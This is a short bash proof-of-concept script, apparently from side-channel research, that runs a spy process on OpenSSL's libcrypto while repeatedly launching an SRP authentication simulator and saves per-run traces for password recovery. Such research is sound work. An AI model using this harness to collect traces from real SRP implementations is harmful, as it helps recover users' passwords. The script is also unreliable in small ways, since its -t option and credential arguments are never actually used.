#!/bin/bash

SPY_SOCK=/tmp/.spy.socket
TARGET_BIN=ADKSimulator

usage() {
    echo "USAGE: poc.sh [-u USERNAME] [-p PASSWORD] [-s SALT] [-t TRAGET] [-o OUTPUT_DIR] [-n N]"
    echo -e "\t-u: define the username to be used in the SRP simulation (default: admin)"
    echo -e "\t-p: define the password to be used in the SRP simulation, (default: password)"
    echo -e "\t-s: define the salt to be used in the SRP simulation (default: 0102030405060708)"
    echo -e "\t-t: define the trageted binary, which performs SRP (in particulat the modular exponentiation)."
    echo -e "\t    The target must take the username, password and salt as an input to perform the computation."
    echo -e "\t    (default: SRP_simulator)"
    echo -e "\t-o: output directory in which the trace will be written (a subdirectory will be created,"
    echo -e "\t    corresponding to the particular username/password/salt). (default: $(pwd))"
    echo -e "\t-n: number of measurement to be perform by the spy. Each measurment correspond to a new run of SRP. (default: 15)"
}

# Start the spy process given 
start_spy() {
    sexpect -sock $SPY_SOCK spawn -nowait -cloexit taskset -c 0-4 run_spy.sh /usr/local/lib/libcrypto.so "$1"
    sleep 1
}

# Function in charge of collecting trace from a username/password/salt setting.
# The function will launch a $nMeasures instances the trarget to collect traces.
#   $1: username
#   $2: password
#   $3: salt
#   $4: number of measures to perform
#   $5: output directory
get_password_traces() {
    username=$1
    password=$2
    salt=$3
    nMeasures=$4
    trace_dir=$5

    for i in `seq 1 $nMeasures`; do
        log_file="${trace_dir}/trace${i}.log"
        # Do not overwrite existing trace
        [[ -f "${trace_dir}/trace${i}.log" ]] && continue
        echo "Logging into $log_file..."
        start_spy ${log_file}
        taskset -c 7 ADKSimulator
        sleep 1

        # End the spy and daemon processes
        sexpect -sock ${SPY_SOCK} kill
        sleep 1
    done
}

username="admin"
passwd="password"
salt="0102030405060708090A0B0C0D0E0F10"
output_dir="$(pwd)"
n_traces=15
while getopts "t:p:s:u:n:o:" opt; do
    case "$opt" in
    t)
        TARGET_BIN=$OPTARG
        ;;
    p)
        passwd=$OPTARG
        ;;
    s)  
        salt=$OPTARG
        ;;
    u)  
        username=$OPTARG
        ;;
    n)
        n_traces=$OPTARG
        ;;
    o)
        output_dir=$OPTARG
        ;;
    *)
        usage
    esac
done

trace_dir="${output_dir}/traces_${username}_${passwd}_${salt}"
mkdir -p "$output_dir"
mkdir -p "$trace_dir"
get_password_traces $username $passwd $salt $n_traces "$trace_dir"
chmod -R o+rw "$trace_dir"